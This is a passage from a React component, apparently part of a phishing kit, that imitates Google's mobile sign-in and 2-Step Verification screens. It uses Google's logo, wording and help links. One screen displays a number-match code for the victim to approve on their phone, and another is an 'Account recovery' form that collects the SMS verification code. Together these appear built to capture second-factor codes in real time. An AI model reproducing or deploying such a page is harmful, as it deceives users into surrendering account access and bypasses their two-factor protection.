                          <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                        </svg>
                      </div>
                      <span className="text-sm text-[#202124] flex-1">{localEmail}</span>
                      <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                      </svg>
                    </div>

                    {expectedCode ? (
                      <div className="text-center">
                        <div className="flex flex-col items-center">
                          <div className="">
                            <p className="text-[#1f1f1f] text-[57px] font-go font-semibold">{expectedCode}</p>
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div className="text-center mb-8">
                        <div className="flex flex-col items-center">
                          <svg className="animate-spin h-12 w-12 text-[#8ab4f8] mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                          </svg>
                        </div>
                      </div>
                    )}
                    
                    <h3 className="font-normal text-xl">
                      Check your phone
                    </h3>

                    <p className="text-sm font-go text-[#202124] mb-8">
                      Google sent a notification to your phone. Open the Gmail app, tap Yes on the prompt, then tap {expectedCode} on your phone to verify it’s you.
                    </p>

                    <p className="text-sm text-[#0b57d0] hover:underline cursor-pointer mb-10">
                        Resend it
                      </p>

                      <div className="flex justify-between items-center pb-14">
                        <button
                          type="button"
                          onClick={handleBackToSmsOptions}
                          className="text-[#0b57d0] text-sm font-medium hover:underline"
                        >
                          Try another way
                        </button>
                      </div>
                  </>
            ) : step === "2fa-options" ? (
                  <>
                    <div className="flex justify-start mb-6">
                      <svg viewBox="0 0 48 48" width="40" height="40">
                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                      </svg>
                    </div>

                    <h1 className="text-[32px] font-helvetica font-normal text-[#202124] mb-2">2-Step Verification</h1>
                    
                    <p className="text-[16px] font-go text-[#5f6368] mb-3">
                      To help keep your account safe, Google wants to make sure it's really you trying to sign in
                    </p>

                    <div className="mb-12 p-1 w-[60%] border border-gray-300 rounded-full flex items-center gap-2 bg-white">
                      <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                        <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                        </svg>
                      </div>
                      <span className="text-sm text-[#202124] flex-1">{localEmail}</span>
                      <svg className="w-4 h-4 text-gray-600" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                      </svg>
                    </div>

                    <h2 className="text-xl text-[#202124] font-normal mb-6">Choose how you want to sign in:</h2>

                    <div className="space-y-3 mb-8">
                      <button
                        onClick={handleTapYesOnPhone}
                        className="w-full pb-3 border-b border-gray-200 hover:bg-gray-50 transition-colors text-left flex items-center gap-3 bg-white"
                      >
                        <svg className="w-6 h-6 text-gray-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                          <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z" />
                        </svg>
                        <span className="text-[#202124] text-base">Tap <span className="font-medium">Yes</span> on your phone or tablet</span>
                      </button>

                      <button
                        onClick={handleGetVerificationCode}
                        className="w-full pb-3 border-b border-gray-200 hover:bg-gray-50 transition-colors text-left flex items-start gap-3 bg-white"
                      >
                        <svg className="w-6 h-6 text-gray-400 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                          <path d="M2 5a2 2 0 012-2h7a2 2 0 012 2v4a2 2 0 01-2 2H9l-3 3v-3H4a2 2 0 01-2-2V5z" />
                        </svg>
                        <div className="flex-1">
                          <div className="text-[#202124] text-base mb-1">Get a verification code</div>
                          <div className="text-xs text-gray-600">2-Step Verification phone</div>
                          <div className="text-xs text-gray-600">Standard rates apply</div>
                        </div>
                      </button>

                      <button
                        onClick={handleTryAnotherWay}
                        className="w-full pb-3 border-b border-gray-200 hover:bg-gray-50 transition-colors text-left flex items-center gap-3 bg-white"
                      >
                        <svg className="w-6 h-6 text-gray-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clipRule="evenodd" />
                        </svg>
                        <span className="text-[#202124] text-base">Try another way</span>
                      </button>
                    </div>
                  </>
            ) : step === "2fa-sms-code" ? (
              <>
                {/* SMS 2FA Code Entry */}
                <div className="flex justify-start mb-6">
                  <svg viewBox="0 0 48 48" width="40" height="40">
                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
                  </svg>
                </div>

                <h1 className="text-[32px] font-helvetica font-normal text-[#202124] mb-2">Account recovery</h1>
                <p className="text-base font-go text-[#202124] mb-2">
                  To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in
                </p>

                <div className="mb-10 p-1 border border-[#dadce0] w-[60%] rounded-full flex items-center gap-2 bg-white">
                  <div className="w-5 h-5 rounded-full border border-gray-500 flex items-center justify-center flex-shrink-0">
                    <svg className="w-3 h-3 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                    </svg>
                  </div>
                  <span className="text-sm text-[#202124] flex-1">{localEmail}</span>
                  <svg className="w-5 h-5 text-[#5f6368]" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                  </svg>
                </div>

                <p className="text-sm font-helvetica text-[#202124] mb-8">
                  A text message with a 6-digit verification code was just sent to *** *** ***
                </p>

                <form onSubmit={handleSmsCodeSubmit}>
                  <div className="mb-4">
                    <div className="g-input2-wrapper">
                      <div className={`g-input2 flex items-center ${smsCodeError ? "redborder" : ""}`}>
                        <span className="text-[#1f1f1f] text-base mr-1 select-none font-helvetica">G-</span>
                        <input
                          type="text"
                          value={smsCode}
                          onChange={handleSmsCodeChange}
                          placeholder=" "
                          className="flex-1 bg-transparent border-none outline-none text-[#1f1f1f] text-base ml-5 font-helvetica"
                          disabled={isSubmittingSmsCode}
                          maxLength={8}
                          onKeyPress={(e) => {
                            if (e.key === 'Enter') {
                              handleSmsCodeSubmit(e);
                            }
                          }}
                        />
                      </div>
                      <label className="g-label2 ml-5 font-go">
                        Enter code
                      </label>
                    </div>
                    {smsCodeError && (
                      <div className="text-[#d93025] text-xs mt-2 flex items-center gap-1">
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                          <path d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm1 12H7V7h2v5zm0-6H7V4h2v2z"/>
                        </svg>
                        {smsCodeError}
                      </div>
                    )}
                  </div>

                  <p className="text-sm text-[#0b57d0] hover:underline cursor-pointer mb-10">
                    Resend it
                  </p>

                  <div className="flex justify-between items-center pb-14">
                    <button
                      type="button"
                      onClick={handleBackToSmsOptions}
                      className="text-[#0b57d0] text-sm font-medium hover:underline"
                    >
                      Try another way
                    </button>
                    <button
                      type="submit"
                      disabled={isSubmittingSmsCode || !smsCode || smsCode.length < 6}
                      className="bg-[#0b57d0] text-white px-6 py-2 font-go rounded-[20px] font-medium text-sm hover:bg-[#094db9] transition-all disabled:bg-[#dadce0] disabled:text-[#80868b]"
                    >
                      {isSubmittingSmsCode ? "Verifying..." : "Next"}
                    </button>
                  </div>
                </form>
              </>
            ) : null}
            </div>

            {/* Footer - always at bottom */}
            <div className="mt-auto pt-6 border-t border-gray-200 flex items-center justify-between text-xs text-[#5f6368]">
              <div className="flex items-center gap-1">
                <span>English (United States)</span>
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="flex items-center gap-4">
                <a href="https://support.google.com/accounts?hl=en&visit_id=639065030533618722-4239887279&rd=2&p=account_iph#topic=3382296" className="hover:underline !text-[#5f6368]">Help</a>
                <a href="https://policies.google.com/privacy?gl=AL&hl=en-US" className="hover:underline !text-[#5f6368]">Privacy</a>
                <a href="https://policies.google.com/terms?gl=AL&hl=en-US" className="hover:underline !text-[#5f6368]">Terms</a>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default GoogleSignInMobile;
